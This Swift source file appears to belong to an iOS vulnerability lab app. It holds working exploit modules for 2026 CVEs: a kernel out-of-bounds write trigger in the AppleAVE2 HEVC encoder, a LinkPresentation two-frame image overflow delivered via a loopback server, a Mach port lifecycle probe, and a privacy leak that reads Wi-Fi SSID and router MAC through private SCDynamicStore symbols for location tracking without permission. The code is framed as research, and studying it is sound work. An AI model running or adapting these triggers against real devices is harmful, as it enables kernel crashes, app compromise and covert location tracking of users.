import Foundation
import UIKit
import ImageIO
import CoreGraphics
import CoreMedia
import CoreVideo
import VideoToolbox
import LinkPresentation
import Network
import SystemConfiguration
import SystemConfiguration.CaptiveNetwork
import UniformTypeIdentifiers

// MARK: - CVE-2026-112705 / CVE-2026-112621 / CVE-2026-84636
//
// Three arrivals from public research. Each one is split into a probe and, where the
// trigger is destructive, a separate fire module: the probe is safe to run while
// building the lab, the fire module is a deliberate one-tap trigger on a device that
// is allowed to die for the result.

extension Catalog {

    static let arrivals: [ExploitModule] = [

        // ── CVE-2026-112705 · AppleAVE2 NumberOfTemporalLayers ──────────────
        ExploitModule(
            id: "ave.ntl",
            titleZh: "AppleAVE2 时间层数属性面（NumberOfTemporalLayers）",
            cve: "CVE-2026-112705",
            component: "AppleAVE2 · VideoToolbox HEVC encoder",
            primitive: .oobWrite,
            reach: .kernel,
            tier: 3,
            summaryZh: """
            VideoToolbox 的 HEVC 压缩会话把 NumberOfTemporalLayers 原样下发给 AppleAVE2 驱动，驱动按声明值索引一张固定大小的层表。16463 越过表尾，第一次提交帧时在 AppleAVE2 +0xDA78 写入固定偏移，内核 data abort；16462 存活。iOS 27.2 在 SetProperty 阶段就返回 -12900。本模块只做属性面：建会话、设置 EncoderUsage=1 / RCMode=20、写入 NTL 并回读，不提交任何帧。
            """,
            notesZh: """
            fire 版本才会提交一帧并触发 panic。macOS 上同一驱动同样可达：实测 16463 在 macOS 上 SetProperty 返回 0（回读被归一化为 1），说明属性被接受但值没有透传，帧提交仍有内核崩溃风险 —— 这也是本机被 112705 打崩过一次之后，宿主只编译不执行的原因。设备上跑 fire 之前先确认目标机允许重启。
            """,
            run: { ctx in
                ctx.arm("ave.ntl", "session + property acceptance")
                var lines: [String] = []
                let (session, create) = aveSession()
                lines.append("VTCompressionSessionCreate(hvc1) = \(create) \(fourCC(create))")
                guard create == 0, let s = session else {
                    ctx.fail("ave.ntl", "session=\(create)")
                    throw LabError(message: tl("HEVC 压缩会话创建失败"))
                }
                defer { VTCompressionSessionInvalidate(s) }

                let su = aveSet(s, "EncoderUsage", NSNumber(value: 1))
                let sr = aveSet(s, "RCMode", NSNumber(value: 20))
                _ = aveSet(s, kVTCompressionPropertyKey_RealTime as String, kCFBooleanFalse)
                lines.append("EncoderUsage=\(su)  RCMode=\(sr)")

                var accepted: [Int] = []
                for n in [0, 1, 7, 8, 64, 1024, 16462, 16463] {
                    let st = aveSet(s, "NumberOfTemporalLayers", NSNumber(value: n))
                    lines.append("NTL \(n): status=\(st)  readback: \(aveRead(s, "NumberOfTemporalLayers"))")
                    if st == 0 { accepted.append(n) }
                }
                ctx.disarm("ave.ntl", "accepted=\(accepted.count)/8")
                let verdict: String
                if accepted.contains(16463) {
                    verdict = tl("16463 被接受 —— 该构建的设备在 fire 时会 panic")
                } else if accepted.isEmpty {
                    verdict = tl("全部被拒 —— 27.2+ 的修复面")
                } else {
                    verdict = tl("部分档位被接受")
                }
                return ModuleOutcome(headline: verdict, detail: lines.joined(separator: "\n"),
                                     evidence: [tl("引用: AppleAVE2 +0xDA78, far=0x59"), tl("16462 存活 / 16463 触发")])
            }),

        ExploitModule(
            id: "ave.ntl.fire",
            titleZh: "AppleAVE2 时间层数越界写（fire：提交一帧）",
            cve: "CVE-2026-112705",
            component: "AppleAVE2 · VideoToolbox HEVC encoder",
            primitive: .oobWrite,
            reach: .kernel,
            tier: 1,
            summaryZh: """
            完整的 112705 触发：HEVC 会话 → EncoderUsage=1 → RCMode=20 → NumberOfTemporalLayers=16463 → 提交一帧。在 iOS 27.0–27.1 上，驱动在准备这一帧时越界写，内核 data abort，设备重启。进程内看不到返回值 —— 证据是重启后在概览页出现的 processDied 判定，以及 Analytics 里的 panic .ips。
            """,
            notesZh: """
            只应在允许重启的设备上点。模拟器没有 AVE2 硬件编码器，走到 encode 也只会返回状态码，不会崩；macOS 上不要运行对应 POC 的 encode 路径（同驱动，会打崩宿主）。27.2 起 NTL 在 SetProperty 就被拒，fire 会安全返回 -12900。
            """,
            run: { ctx in
                let detail: String
                do {
                    let (session, create) = aveSession()
                    guard create == 0, let s = session else {
                        throw LabError(message: tl("HEVC 会话创建失败: ") + "\(create)")
                    }
                    defer { VTCompressionSessionInvalidate(s) }
                    _ = aveSet(s, "EncoderUsage", NSNumber(value: 1))
                    _ = aveSet(s, "RCMode", NSNumber(value: 20))
                    _ = aveSet(s, kVTCompressionPropertyKey_RealTime as String, kCFBooleanFalse)
                    let sn = aveSet(s, "NumberOfTemporalLayers", NSNumber(value: 16463))
                    guard sn == 0 else {
                        ctx.disarm("ave.ntl.fire", "ntl refused \(sn)")
                        return ModuleOutcome(headline: tl("NTL 被拒 ") + "\(sn)" + tl(" —— 修复构建"),
                                             detail: "NumberOfTemporalLayers=16463 status=\(sn)")
                    }
                    var attrs: [CFString: Any] = [:]
                    attrs[kCVPixelBufferIOSurfacePropertiesKey] = [:] as CFDictionary
                    var pb: CVPixelBuffer?
                    let pc = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                                 kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                                 attrs as CFDictionary, &pb)
                    guard pc == 0, let pixel = pb else {
                        throw LabError(message: tl("像素缓冲创建失败: ") + "\(pc)")
                    }
                    // Arm last: everything that can fail early has already succeeded.
                    ctx.arm("ave.ntl.fire", "NTL=16463 encode[0]")
                    var log = "NumberOfTemporalLayers=16463 accepted\n"
                    for i in 0..<4 {
                        let pts = CMTime(value: CMTimeValue(i), timescale: 30)
                        let st = VTCompressionSessionEncodeFrame(s, imageBuffer: pixel,
                                                                 presentationTimeStamp: pts,
                                                                 duration: .invalid,
                                                                 frameProperties: nil,
                                                                 infoFlagsOut: nil) { _, _, _ in }
                        log += "encode[\(i)] status=\(st)\n"
                        if st != 0 { break }
                    }
                    VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
                    detail = log
                }
                ctx.disarm("ave.ntl.fire", "survived")
                return ModuleOutcome(headline: tl("设备存活 —— 未命中该构建"),
                                     detail: detail + tl("没有发生 panic：模拟器无 AVE2，或系统已是 27.2+"))
            }),

        // ── CVE-2026-112621 · LinkPresentation multi-frame HEIC ─────────────
        ExploitModule(
            id: "lp.heic",
            titleZh: "LinkPresentation 双帧尺寸不一致（池容量核对）",
            cve: "CVE-2026-112621",
            component: "LinkPresentation · LPAnimatedImageTranscoder",
            primitive: .oobWrite,
            reach: .inProcess,
            tier: 3,
            summaryZh: """
            LPAnimatedImageTranscoder 用第 0 帧的像素尺寸配置 video writer，encodeNextFrame 却从当前解码帧取绘制高宽，目标仍是按第 0 帧分配的 CVPixelBuffer 池。256×16 后接 256×48 的双帧容器让 CGContextClearRect 清零 48 行（49152 字节）进 16384 字节的池，越界 32768 字节。本模块只构造容器并核对两帧尺寸与池容量，不做转码。
            """,
            notesZh: """
            宽度必须保持一致：CoreGraphics 会用池的行跨距校验宽度，512 宽的后续帧会让 CGBitmapContextCreate 直接失败，执行到不了 clear。HEIC 是公告里的载体；模拟器不能编 HEIC 时回退到 TIFF，并以 image/gif 的 MIME 投递 —— LPImage 的 _isAnimated 只看响应头，ImageIO 仍按内容识别。fire 版本才会让 LPMetadataProvider 真正拉取并转码。
            """,
            run: { ctx in
                ctx.arm("lp.heic", "container + pool math")
                var lines: [String] = []
                let seed = lpContainer()
                guard let data = seed.data else {
                    ctx.fail("lp.heic", "container")
                    throw LabError(message: tl("无法构造双帧容器"))
                }
                lines.append("format=\(seed.label) bytes=\(data.count)")
                let sizes = lpFrameSizes(data)
                for (i, s) in sizes.enumerated() { lines.append("frame[\(i)] \(s.0)x\(s.1)") }
                guard sizes.count >= 2 else {
                    ctx.fail("lp.heic", "count=\(sizes.count)")
                    throw LabError(message: tl("容器没有两帧"))
                }
                let stride = sizes[0].0 * 4
                let pool = stride * sizes[0].1
                let draw = stride * sizes[1].1
                lines.append("pool = \(sizes[0].0)x\(sizes[0].1) × 4 = \(pool) B (stride \(stride))")
                lines.append("draw = frame 1 height \(sizes[1].1) × stride = \(draw) B")
                lines.append("overflow = \(draw - pool) B")
                lines.append(tl("宽度一致: ") + (sizes[0].0 == sizes[1].0 ? "yes" : "no"))
                ctx.disarm("lp.heic", "overflow=\(draw - pool)")
                return ModuleOutcome(
                    headline: draw > pool ? tl("越界 ") + "\(draw - pool) B" : tl("两帧同尺寸"),
                    detail: lines.joined(separator: "\n"),
                    evidence: [tl("CGBitmapContextCreate 不校验行数"), tl("clear 写入 48 行 / 池只有 16 行")])
            }),

        ExploitModule(
            id: "lp.heic.fire",
            titleZh: "LinkPresentation 链接预览越界写（fire：本地 HTTP + LPMetadataProvider）",
            cve: "CVE-2026-112621",
            component: "LinkPresentation · LPAnimatedImageTranscoder",
            primitive: .oobWrite,
            reach: .inProcess,
            tier: 1,
            summaryZh: """
            走公开投递路径：在 127.0.0.1 上起一个只服务 HTML 与图片的端点，页面 og:image 指向双帧容器，然后调用 LPMetadataProvider。LinkPresentation 自己拉页面、读 og:image、建池、进入 LPAnimatedImageTranscoder。iOS 27.0/27.1 在转码队列上越界写并 SIGBUS/SIGSEGV；27.2 在 encodeNextFrame 比较当前帧与首帧尺寸，不符直接 failed，不进入绘制。
            """,
            notesZh: """
            这是进程内原语：崩的是 app，不是内核。崩溃后重启 app，本模块的判定会是 processDied，engine 日志最后一行是 fire 开始。真机与 Messages 收到链接后点 “加载预览” 是同一条路径；本模块只是把投递端换成本机回环，避免任何外部网络。
            """,
            run: { ctx in
                var lines: [String] = []
                let seed = lpContainer()
                guard let data = seed.data else { throw LabError(message: tl("无法构造双帧容器")) }
                let sizes = lpFrameSizes(data)
                lines.append("format=\(seed.label) frames=\(sizes.map { "\($0.0)x\($0.1)" }.joined(separator: " → "))")

                let server = LoopbackImageServer(image: data, mime: seed.mime)
                let port = try server.start()
                guard port != 0, let url = URL(string: "http://127.0.0.1:\(port)/") else {
                    throw LabError(message: tl("回环服务未能绑定"))
                }
                lines.append("serving \(url)  ct=\(seed.mime)")

                var title: String?
                var error: String?
                let sem = DispatchSemaphore(value: 0)
                ctx.arm("lp.heic.fire", "LPMetadataProvider \(url.absoluteString)")
                DispatchQueue.main.async {
                    let provider = LPMetadataProvider()
                    provider.timeout = 20
                    provider.startFetchingMetadata(for: url) { meta, err in
                        title = meta?.title
                        error = err?.localizedDescription
                        sem.signal()
                    }
                }
                _ = sem.wait(timeout: .now() + 30)
                let served = server.requestCount
                server.stop()
                ctx.disarm("lp.heic.fire", "served=\(served)")

                if let error {
                    return ModuleOutcome(headline: tl("元数据获取失败"), detail: lines.joined(separator: "\n") + "\n" + error,
                                         evidence: [tl("请求数: ") + "\(served)"])
                }
                lines.append("requests served: \(served)")
                lines.append("metadata title: \(title ?? "(none)")")
                return ModuleOutcome(headline: tl("转码器未取第二帧 —— 修复构建"),
                                     detail: lines.joined(separator: "\n"),
                                     evidence: [tl("27.2 在 encodeNextFrame 比较帧尺寸"), tl("崩溃版应留下 processDied")])
            }),


        // ── CVE-2026-112507 · port lifecycle baseline ───────────────────────
        ExploitModule(
            id: "kern.ipc.lifecycle",
            titleZh: "Mach 端口死名通知与名字复用基线（112507 前置）",
            cve: "CVE-2026-112507",
            component: "XNU · ipc_port request table",
            primitive: .probe,
            reach: .kernel,
            tier: 3,
            summaryZh: """
            单线程走一遍 112507 竞态必须保持正确的生命周期：申请 receive right → 插入 send right → 注册 dead-name 通知 → 丢弃 receive right（send right 变成死名）→ 向死名发送（应为 MACH_SEND_INVALID_DEST）→ 从通知端口收 dead-name 消息 → 释放死名并观察同一数字名是否被下一次分配复用。它不制造竞态，也不释放活着的请求表项。
            """,
            notesZh: """
            这是竞态模块的前置基线，不会打崩内核。两项观测决定 112507 的结论是否成立：dead-name 通知是否真的送达、名字是否会被复用。若这里就异常，先查平台语义，不要把它当成 UAF 证据。真机上通知注册应返回 KERN_SUCCESS；模拟器上可能出现注册被拒。
            """,
            run: { ctx in
                ctx.arm("kern.ipc.lifecycle", "dead-name lifecycle")
                let r = KernelIPC.lifecycle()
                ctx.disarm("kern.ipc.lifecycle",
                           "dead=\(r.deadName) reuse=\(r.reused) | " + r.lines.joined(separator: " | "))
                let head: String
                if r.requestKR != KERN_SUCCESS {
                    head = tl("通知注册被拒") + " (\(r.requestKR))" + tl(" — 112507 路径无法武装")
                } else if r.deadName && r.reused {
                    head = tl("dead-name 送达 · 名字被复用")
                } else if r.deadName {
                    head = tl("dead-name 送达 · 名字未复用")
                } else {
                    head = tl("通知已注册但 dead-name 未送达 —— 查通知顺序")
                }
                return ModuleOutcome(
                    headline: head,
                    detail: r.lines.joined(separator: "\n"),
                    evidence: [tl("send to dead name 应为 MACH_SEND_INVALID_DEST"),
                               tl("dead-name 消息 id = 0x40000002"),
                               tl("复用只记录，不构成本身结论")])
            }),

        // ── CVE-2026-84636 · SCDynamicStore without wifi-info ───────────────
        ExploitModule(
            id: "sc.dynamicstore",
            titleZh: "configd 动态存储读取 SSID 与路由器 MAC（无 wifi-info 权限）",
            cve: "CVE-2026-84636",
            component: "SystemConfiguration · configd dynamic store",
            primitive: .infoLeak,
            reach: .systemProcess,
            tier: 1,
            summaryZh: """
            configd 的动态存储把 en0/AirPort 的 SSID_STR、BSSID、信道、认证方式，以及服务 IPv4 条目里的 ARPResolvedHardwareAddress（路由器 MAC）、Global/DNS、DHCP 租约、蓝牙/热点/AutoUnlock 状态暴露给任意沙盒进程。SCDynamicStoreCreate + CopyValue 不需要 com.apple.developer.networking.wifi-info，也不触发定位权限；而受支持的 CNCopyCurrentNetworkInfo 在同一进程里返回 nil。SSID + 路由器 MAC 足以做 WiGLE/Google 的无线定位（约 10–30 米）。
            """,
            notesZh: """
            模块同时打印两条路径：受支持 API 的返回值与动态存储的原始字典，形成同进程对照。模拟器上 en0/AirPort 通常缺失（macOS 侧网络由 utun 承载），真机连 Wi-Fi 时才有 SSID 与 ARP 条目；缺失也是有效结果 —— 说明该平台把键收敛了。README 记录作者标注为 iOS 27 修复，实测以本机输出为准。
            """,
            run: { ctx in
                ctx.arm("sc.dynamicstore", "configd read")
                var lines: [String] = []
                guard let sc = SCDynamicStoreShim() else {
                    ctx.fail("sc.dynamicstore", "dlsym")
                    throw LabError(message: tl("SystemConfiguration 符号解析失败"))
                }
                guard let store = sc.create("cinder27") else {
                    ctx.fail("sc.dynamicstore", "create")
                    throw LabError(message: tl("SCDynamicStoreCreate 失败"))
                }
                let entitled = CNCopyCurrentNetworkInfo("en0" as CFString) as? [String: Any]
                lines.append("CNCopyCurrentNetworkInfo: " + (entitled.map { "\($0)" } ?? "nil"))

                func value(_ key: String) -> [String: Any]? {
                    sc.copy(store, key) as? [String: Any]
                }
                let airport = value("State:/Network/Interface/en0/AirPort")
                lines.append("en0/AirPort: " + (airport.map { "\($0)" } ?? "<absent>"))
                let ssid = airport?["SSID_STR"] as? String
                let global = value("State:/Network/Global/IPv4")
                lines.append("Global/IPv4: " + (global.map { "\($0)" } ?? "<absent>"))
                var routerMAC: String?
                if let uuid = global?["PrimaryService"] as? String {
                    let svc = value("State:/Network/Service/\(uuid)/IPv4")
                    lines.append("Service IPv4: " + (svc.map { "\($0)" } ?? "<absent>"))
                    routerMAC = svc?["ARPResolvedHardwareAddress"] as? String
                }
                for key in ["State:/Network/Global/DNS",
                            "com.apple.MobileBluetooth",
                            "com.apple.MobileInternetSharing",
                            "com.apple.sharing:/AutoUnlock/Enabled",
                            "State:/IOKit/LowBatteryWarning"] {
                    lines.append("\(key): " + (value(key).map { "\($0)" } ?? "<absent>"))
                }
                if let keys = sc.keys(store, "State:/Network/.*") as? [String] {
                    lines.append("State:/Network keys: \(keys.count)")
                }
                ctx.disarm("sc.dynamicstore", "ssid=\(ssid != nil) mac=\(routerMAC != nil)")
                let headline: String
                if let ssid, let routerMAC {
                    headline = "SSID=\(ssid) · router=\(routerMAC)"
                } else if ssid != nil {
                    headline = tl("SSID 可读 · 路由器 MAC 缺失")
                } else {
                    headline = tl("动态存储无 AirPort 条目（本平台/未连 Wi-Fi）")
                }
                return ModuleOutcome(headline: headline, detail: lines.joined(separator: "\n"),
                                     evidence: [tl("同进程 CNCopyCurrentNetworkInfo = nil"),
                                                tl("SSID + 路由器 MAC = 无定位权限的无线定位")])
            }),
    ]
}

// MARK: - shared helpers

private func fourCC(_ v: OSStatus) -> String {
    let n = UInt32(bitPattern: v)
    let b = [UInt8((n >> 24) & 0xff), UInt8((n >> 16) & 0xff), UInt8((n >> 8) & 0xff), UInt8(n & 0xff)]
    if b.allSatisfy({ $0 >= 0x20 && $0 < 0x7f }) { return "'" + String(bytes: b, encoding: .ascii)! + "'" }
    return "\(v)"
}

private func aveSession() -> (VTCompressionSession?, OSStatus) {
    var session: VTCompressionSession?
    let st = VTCompressionSessionCreate(allocator: kCFAllocatorDefault,
                                        width: 1280, height: 720,
                                        codecType: kCMVideoCodecType_HEVC,
                                        encoderSpecification: nil,
                                        imageBufferAttributes: nil,
                                        compressedDataAllocator: nil,
                                        outputCallback: nil,
                                        refcon: nil,
                                        compressionSessionOut: &session)
    return (session, st)
}

private func aveSet(_ s: VTCompressionSession, _ key: String, _ value: CFTypeRef) -> OSStatus {
    VTSessionSetProperty(s, key: key as CFString, value: value)
}

private func aveRead(_ s: VTCompressionSession, _ key: String) -> String {
    var out: CFTypeRef?
    let st = VTSessionCopyProperty(s, key: key as CFString, allocator: kCFAllocatorDefault, valueOut: &out)
    guard st == 0, let v = out else { return "copyErr=\(st)" }
    return "\(v)"
}

private func lpSolid(_ w: Int, _ h: Int, _ r: CGFloat, _ g: CGFloat, _ b: CGFloat) -> CGImage? {
    let cs = CGColorSpaceCreateDeviceRGB()
    guard let ctx = CGContext(data: nil, width: w, height: h, bitsPerComponent: 8,
                              bytesPerRow: w * 4, space: cs,
                              bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else { return nil }
    ctx.setFillColor(red: r, green: g, blue: b, alpha: 1)
    ctx.fill(CGRect(x: 0, y: 0, width: w, height: h))
    return ctx.makeImage()
}

/// HEIC first (the advisory format); TIFF served as image/gif is the fallback that
/// still decodes as independent pages when the platform cannot encode HEIC.
private func lpContainer() -> (data: Data?, label: String, mime: String) {
    for (type, label, mime) in [(UTType.heic, "heic", "image/heic"),
                                (UTType.tiff, "tiff", "image/gif")] {
        let out = NSMutableData()
        guard let dest = CGImageDestinationCreateWithData(out, type.identifier as CFString, 2, nil) else { continue }
        guard let f0 = lpSolid(256, 16, 0.90, 0.10, 0.10),
              let f1 = lpSolid(256, 48, 0.10, 0.20, 0.90) else { continue }
        CGImageDestinationAddImage(dest, f0, nil)
        CGImageDestinationAddImage(dest, f1, nil)
        guard CGImageDestinationFinalize(dest) else { continue }
        if lpFrameSizes(out as Data).count == 2 { return (out as Data, label, mime) }
    }
    return (nil, "", "")
}

private func lpFrameSizes(_ data: Data) -> [(Int, Int)] {
    guard let src = CGImageSourceCreateWithData(data as CFData, nil) else { return [] }
    let n = CGImageSourceGetCount(src)
    var out: [(Int, Int)] = []
    for i in 0..<min(n, 2) {
        guard let img = CGImageSourceCreateImageAtIndex(src, i, nil) else { continue }
        out.append((img.width, img.height))
    }
    return out
}

/// Minimal loopback HTTP server: one HTML page with og:image, one image endpoint.
/// LinkPresentation fetches both exactly as it would from a remote host.
private final class LoopbackImageServer {
    private let listener: NWListener
    private let image: Data
    private let mime: String
    private let lock = NSLock()
    private var served = 0

    var requestCount: Int { lock.lock(); defer { lock.unlock() }; return served }

    init(image: Data, mime: String) {
        self.image = image
        self.mime = mime
        let params = NWParameters.tcp
        params.allowLocalEndpointReuse = true
        listener = try! NWListener(using: params, on: .any)
    }

    func start() throws -> UInt16 {
        let ready = DispatchSemaphore(value: 0)
        listener.stateUpdateHandler = { state in
            if case .ready = state { ready.signal() }
        }
        listener.newConnectionHandler = { [weak self] conn in self?.serve(conn) }
        listener.start(queue: .global())
        _ = ready.wait(timeout: .now() + 5)
        return listener.port?.rawValue ?? 0
    }

    func stop() { listener.cancel() }

    private func serve(_ conn: NWConnection) {
        conn.start(queue: .global())
        conn.receive(minimumIncompleteLength: 1, maximumLength: 8192) { [weak self] data, _, _, _ in
            guard let self, let data, let head = String(data: data, encoding: .utf8) else {
                conn.cancel(); return
            }
            self.lock.lock(); self.served += 1; self.lock.unlock()
            let path = head.split(separator: " ").dropFirst().first.map(String.init) ?? "/"
            if path.hasPrefix("/pic") {
                self.respond(conn, body: self.image, type: self.mime)
            } else {
                let page = """
                <!doctype html><html><head><meta charset="utf-8">
                <meta property="og:title" content="CVE-2026-112621">
                <meta property="og:image" content="http://127.0.0.1:\(self.listener.port?.rawValue ?? 0)/pic">
                </head><body>cve-2026-112621</body></html>
                """
                self.respond(conn, body: Data(page.utf8), type: "text/html")
            }
        }
    }

    private func respond(_ conn: NWConnection, body: Data, type: String) {
        var out = Data("HTTP/1.1 200 OK\r\nContent-Type: \(type)\r\nContent-Length: \(body.count)\r\nConnection: close\r\n\r\n".utf8)
        out.append(body)
        conn.send(content: out, completion: .contentProcessed { _ in conn.cancel() })
    }
}


/// SCDynamicStore is private on iOS — the public SDK marks it unavailable. The symbols
/// still live in SystemConfiguration, and configd answers an unentitled process, which
/// is the whole point of the CVE. Resolve them by name.
private final class SCDynamicStoreShim {
    typealias CreateFn = @convention(c) (CFAllocator?, CFString, UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> CFTypeRef?
    typealias CopyFn = @convention(c) (CFTypeRef, CFString) -> CFPropertyList?
    typealias KeysFn = @convention(c) (CFTypeRef, CFString) -> CFArray?

    private let createFn: CreateFn
    private let copyFn: CopyFn
    private let keysFn: KeysFn

    init?() {
        guard let h = dlopen("/System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguration", RTLD_NOW) else {
            return nil
        }
        guard let c = dlsym(h, "SCDynamicStoreCreate"),
              let v = dlsym(h, "SCDynamicStoreCopyValue"),
              let k = dlsym(h, "SCDynamicStoreCopyKeyList") else { return nil }
        createFn = unsafeBitCast(c, to: CreateFn.self)
        copyFn = unsafeBitCast(v, to: CopyFn.self)
        keysFn = unsafeBitCast(k, to: KeysFn.self)
    }

    func create(_ name: String) -> CFTypeRef? {
        createFn(nil, name as CFString, nil, nil)
    }

    func copy(_ store: CFTypeRef, _ key: String) -> CFPropertyList? {
        copyFn(store, key as CFString)
    }

    func keys(_ store: CFTypeRef, _ pattern: String) -> CFArray? {
        keysFn(store, pattern as CFString)
    }
}
